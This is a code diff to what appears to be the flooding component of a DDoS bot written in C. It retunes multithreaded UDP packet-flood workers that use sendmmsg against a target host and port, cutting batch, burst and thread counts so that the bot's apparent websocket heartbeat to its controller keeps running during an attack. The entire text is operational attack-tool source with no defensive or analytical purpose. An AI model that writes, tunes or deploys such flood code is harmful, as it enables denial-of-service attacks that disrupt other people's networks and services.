@@ -95,7 +95,8 @@ typedef struct {
     int port_base; int duration; int cpu_id; char host[256];
 } MegaThread;
 
-#define MEGA_W_BATCH 65535
+#define MEGA_W_BATCH 4096   /* balanced: high throughput but yields CPU for WS */
+#define MEGA_W_BURST 16     /* 16 sendmmsg per socket per iteration */
 #define MEGA_W_RING  1048576
 
 static void *mega_worker(void *arg) {
@@ -104,7 +105,7 @@ static void *mega_worker(void *arg) {
     cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
     pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
 
-    /* MATCH BASE: batch 65535, iov_len=0 zero-byte UDP = max pps, no payload copy */
+    /* Balanced MEGA: batch 4096, burst 16 — leaves CPU for WS heartbeat/recv */
     size_t m_sz = sizeof(struct mmsghdr) * MEGA_W_BATCH;
     size_t v_sz = sizeof(struct iovec) * MEGA_W_BATCH;
     struct mmsghdr *msgs = mmap(NULL, m_sz, PROT_READ | PROT_WRITE,
@@ -150,11 +151,10 @@ static void *mega_worker(void *arg) {
         mt->target.sin_port = htons(dp);
 
         for (int s = 0; s < mt->sock_count && !is_attack_stop(); s++) {
-            /* MATCH BASE: BURST_MULTIPLIER 64 = sendmmsg x64 per socket */
-            for (int b = 0; b < 64 && !is_attack_stop(); b++) {
+            for (int b = 0; b < MEGA_W_BURST && !is_attack_stop(); b++) {
                 int r = safe_sendmmsg(mt->socks[s], msgs, MEGA_W_BATCH, flags);
                 if (r > 0) pkt_sent(r);
-                else if (errno == EAGAIN || errno == EWOULDBLOCK) usleep(1);
+                else if (errno == EAGAIN || errno == EWOULDBLOCK) { usleep(1); break; }
             }
 #ifdef MSG_ZEROCOPY
             if ((++zc & 0x7) == 0) {
@@ -165,6 +165,8 @@ static void *mega_worker(void *arg) {
                 while (recvmsg(mt->socks[s], &zm, MSG_ERRQUEUE | MSG_DONTWAIT) > 0) {}
             }
 #endif
+            /* Yield CPU every 4 sockets so WS heartbeat/recv can run */
+            if ((s & 3) == 3) usleep(500);
         }
     }
 
@@ -670,9 +672,9 @@ void *bg_attack_thread(void *arg)
             free(socks); set_attack_active(0); free(ctx); return NULL;
         }
 
-        int n_udp = cores * 2;   /* MATCH BASE: 2 threads per core */
+        int n_udp = cores;
         if (n_udp < 1) n_udp = 1;
-        if (n_udp > 32) n_udp = 32;
+        if (n_udp > 16) n_udp = 16;
         if (n_udp > sock_cnt) n_udp = sock_cnt;
         int threads = n_udp;
 
